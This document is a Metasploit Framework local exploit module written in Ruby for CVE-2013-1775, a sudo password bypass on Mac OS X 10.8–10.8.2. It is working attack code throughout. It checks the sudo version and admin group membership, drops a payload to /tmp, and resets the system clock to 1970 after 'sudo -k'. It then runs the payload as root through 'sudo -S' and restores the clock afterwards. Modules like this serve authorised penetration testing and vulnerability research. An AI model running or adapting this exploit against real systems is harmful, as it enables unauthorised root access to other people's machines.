##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#
# http://metasploit.com/
##
require 'shellwords'

class Metasploit3 < Msf::Exploit::Local
	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Exploit::EXE
	include Msf::Exploit::FileDropper

	SYSTEMSETUP_PATH = "/usr/sbin/systemsetup"
	SUDOER_GROUP = "admin"
	VULNERABLE_VERSION_RANGES = [['1.6.0', '1.7.10p6'], ['1.8.0', '1.8.6p6']]

	# saved clock config
	attr_accessor :time, :date, :networked, :zone, :network_server

	def initialize(info={})
		super(update_info(info,
			'Name'          => 'Mac OS 10.8-10.8.2 Sudo Password Bypass',
			'Description'   => %q{
				Gains a session with root permissions on versions of OS X with
				sudo binary vulnerable to CVE-2013-1775. Works on Mac OS 10.8-10.8.2,
				and possibly lower versions.

				If your session belongs to a user with Administrative Privileges
				(the user is in the sudoers file and is in the "admin group"), and the
				user has ever run the "sudo" command, it is possible to become the super
				user by running `sudo -k` and then resetting the system clock to 01-01-1970.

				Fails silently if the user is not an admin or if the user has never
				ran the sudo command.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'joev <jvennix[at]rapid7.com>'],
			'Platform'      => [ 'osx' ],
			'SessionTypes'  => [ 'shell', 'meterpreter'],
			'References'    => [['CVE', '2013-1775']],
			'Platform'      => 'osx',
			'Arch'          => [ ARCH_X86, ARCH_X64, ARCH_CMD ],
			'Targets'       => [
				[
					'Mac OS X x86 (Native Payload)', {
						'Platform' => 'osx',
						'Arch' => ARCH_X86
					}
				], [
					'Mac OS X x64 (Native Payload)', {
						'Platform' => 'osx',
						'Arch' => ARCH_X64
					}
				], [
					'CMD', {
						'Platform' => 'unix',
						'Arch' => ARCH_CMD
					}
				]
			],
			'DefaultOptions' => { "PrependFork" => true },
			'DefaultTarget' => 0
		))
	end

	# ensure target is vulnerable by checking sudo vn and checking
	# user is in admin group.
	def check
		if cmd_exec("sudo -V") =~ /version\s+([^\s]*)\s*$/
			sudo_vn = $1
			sudo_vn_parts = sudo_vn.split(/[\.p]/).map(&:to_i)
			# check vn between 1.6.0 through 1.7.10p6
			# and 1.8.0 through 1.8.6p6 
			if not vn_bt(sudo_vn, VULNERABLE_VERSION_RANGES)
				print_error "sudo version #{sudo_vn} not vulnerable."
				return Exploit::CheckCode::Safe
			end
		else
			print_error "sudo not detected on the system."
			return Exploit::CheckCode::Safe
		end

		if not user_in_admin_group?
			print_error "sudo version is vulnerable, but user is not in the "+
			            "admin group (necessary to change the date)."
			Exploit::CheckCode::Safe
		end
		# one root for you sir
		Exploit::CheckCode::Vulnerable
	end

	def exploit
		if not user_in_admin_group?
			fail_with(Exploit::Failure::NotFound, "User is not in the 'admin' group, bailing.")
		else
			# "remember" the current system time/date/network/zone
			print_good("User is an admin, continuing...")
			print_status("Saving system clock config...")

			# drop the payload (unless CMD)
			if using_native_target?
				write_file(drop_path, generate_payload_exe)
				register_files_for_cleanup(drop_path)
				cmd_exec("chmod +x #{[drop_path].shelljoin}")
				print_status("Payload dropped and registered for cleanup")
			end

			@time = cmd_exec("#{SYSTEMSETUP_PATH} -gettime").match(/^time: (.*)$/i)[1]
			@date = cmd_exec("#{SYSTEMSETUP_PATH} -getdate").match(/^date: (.*)$/i)[1]
			@networked = cmd_exec("#{SYSTEMSETUP_PATH} -getusingnetworktime") =~ (/On$/)
			@zone = cmd_exec("#{SYSTEMSETUP_PATH} -gettimezone").match(/^time zone: (.*)$/i)[1]
			@network_server = if @networked
				cmd_exec("#{SYSTEMSETUP_PATH} -getnetworktimeserver").match(/time server: (.*)$/i)[1]
			end
			run_sudo_cmd
		end
	end

	def cleanup
		return if @_cleaning_up
		@_cleaning_up = true

		print_status("Resetting system clock to original values") if @time
		cmd_exec("#{SYSTEMSETUP_PATH} -settimezone #{[@zone].shelljoin}") unless @zone.nil?
		cmd_exec("#{SYSTEMSETUP_PATH} -setdate #{[@date].shelljoin}") unless @date.nil?
		cmd_exec("#{SYSTEMSETUP_PATH} -settime #{[@time].shelljoin}") unless @time.nil?
		if @networked
			cmd_exec("#{SYSTEMSETUP_PATH} -setusingnetworktime On")
			unless @network_server.nil?
				cmd_exec("#{SYSTEMSETUP_PATH} -setnetworktimeserver #{[@network_server].shelljoin}")
			end
		end
		super
	end

	private

	def run_sudo_cmd
		sudo_cmd_raw = if using_native_target?
			['sudo', '-S', [drop_path].shelljoin].join(' ')
		elsif using_cmd_target?
			['sudo', '-S', payload.encoded].join(' ')
		end

		# to prevent the password prompt from destroying session
		sudo_cmd = 'echo "" | '+sudo_cmd_raw

		cmd_exec(
			"sudo -k; \n"+
			"#{SYSTEMSETUP_PATH} -setusingnetworktime Off -setdate 01:01:1970"+
			" -settimezone GMT -settime 00:00"
		)

		print_good "Running: "
		print sudo_cmd + "\n"
		output = cmd_exec(sudo_cmd, nil, 5)
		session.shell_write("\x1a") # send ctrl-z :)
		session.reset_ring_sequence
		if output =~ /incorrect password attempts\s*$/i
			fail_with(Exploit::Failure::NotFound,
				"User has never run sudo, and is therefore not vulnerable. Bailing.")
		end
		print_good output
	end

	# helper methods for accessing datastore
	def using_native_target?; target.name =~ /native/i; end
	def using_cmd_target?; target.name =~ /cmd/i; end
	def drop_path; '/tmp/joe.exe'; end

	# checks that the user is in OSX's admin group, necessary to change sys clock
	def user_in_admin_group?
		cmd_exec("groups `whoami`").split(/\s+/).include?(SUDOER_GROUP)
	end

	# helper methods for dealing with sudo's vn num
	def parse_vn(vn_str); vn_str.split(/[\.p]/).map(&:to_i); end
	def vn_bt(vn, ranges) # e.g. ('1.7.1', [['1.7.0', '1.7.6p44']])
		vn_parts = parse_vn(vn)
		ranges.any? do |range|
			min_parts = parse_vn(range[0])
			max_parts = parse_vn(range[1])
			vn_parts.all? do |part|
				min = min_parts.shift
				max = max_parts.shift
				(min.nil? or (not part.nil? and part >= min)) and
					(part.nil? or (not max.nil? and part <= max))
			end
		end
	end

end
